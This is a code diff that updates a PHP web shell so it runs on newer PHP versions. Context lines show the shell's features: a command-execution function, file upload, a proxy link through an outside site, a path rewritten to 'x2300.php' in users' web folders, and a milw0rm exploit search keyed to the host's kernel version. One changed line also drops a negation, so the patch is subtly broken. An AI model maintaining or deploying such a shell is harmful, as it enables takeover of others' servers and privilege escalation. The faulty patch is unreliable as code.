@@ -42,7 +42,7 @@
 
 function selfURL()
 {
-    $s = empty($_SERVER['HTTPS']) ? '' : ('on' == $_SERVER['HTTPS']) ? 's' : '';
+    $s = empty($_SERVER['HTTPS']) ? '' : (('on' == $_SERVER['HTTPS']) ? 's' : '');
     $protocol = strleft(strtolower($_SERVER['SERVER_PROTOCOL']), '/') . $s;
     $port = ('80' == $_SERVER['SERVER_PORT']) ? '' : (':' . $_SERVER['SERVER_PORT']);
 
@@ -57,9 +57,10 @@ $phprox = 'http://twofaced.org/proxy/index.php?q=' . $selfurl;
 //end of link
 
 //milw0rm search
-$Lversion = php_uname(r);
-$OSV = php_uname(s);
-if (eregi('Linux', $OSV)) {
+$Lversion = php_uname('r');
+$OSV = php_uname('s');
+// if (eregi('Linux', $OSV)) {
+if (false !== strpos($OSV, 'Linux')) {
     $Lversion = substr($Lversion, 0, 6);
     $millink = 'http://milw0rm.com/search.php?dong=Linux Kernel ' . $Lversion;
 } else {
@@ -287,7 +288,7 @@ function ex($cfe)
 //Start Enumerate function
 //function ENUMERATE()
 
-$hostname_x = php_uname(n);
+$hostname_x = php_uname('n');
 $itshome = getcwd();
 $itshome = str_replace('/home/', '~', $itshome);
 $itshome = str_replace('/public_html', '/x2300.php', $itshome);
@@ -308,7 +309,11 @@ if (!function_exists('getmicrotime')) {
 error_reporting(5);
 $adires = '';
 @ignore_user_abort(true);
-@set_magic_quotes_runtime(0);
+
+if (function_exists('set_magic_quotes_runtime')) {
+    @set_magic_quotes_runtime(0);
+}
+
 $win = 'win' == strtolower(substr(PHP_OS, 0, 3));
 define('starttime', getmicrotime());
 if (get_magic_quotes_gpc()) {
@@ -1530,7 +1535,8 @@ if ('img' != $act) {
     }
     $sort[1] = strtolower($sort[1]);
     $DISP_SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
-    if (!ereg('PHP/' . phpversion(), $DISP_SERVER_SOFTWARE)) {
+    // if (!ereg('PHP/' . phpversion(), $DISP_SERVER_SOFTWARE)) {
+    if (preg_match("/PHP\/" . phpversion() . '/', $DISP_SERVER_SOFTWARE)) {
         $DISP_SERVER_SOFTWARE .= '. PHP/' . phpversion();
     }
     $DISP_SERVER_SOFTWARE = str_replace('PHP/' . phpversion(), '<a href="' . $surl . 'act=phpinfo" target="_blank"><b><u>PHP/' . phpversion() . '</u></b></a>', htmlspecialchars($DISP_SERVER_SOFTWARE));
@@ -3033,7 +3039,8 @@ File-name (auto-fill): <input name=uploadfilename size=25><br><br>
                         $disppath = '<u>' . $disppath . '</u>';
                     }
                     foreach ($regxp_highlight as $r) {
-                        if (ereg($r[0], $o)) {
+                        // if (ereg($r[0], $o)) {
+                        if (preg_match('/' . $r[0] . '/', $o)) {
                             if ((!is_numeric($r[1])) or ($r[1] > 3)) {
                                 $r[1] = 0;
                                 ob_clean();
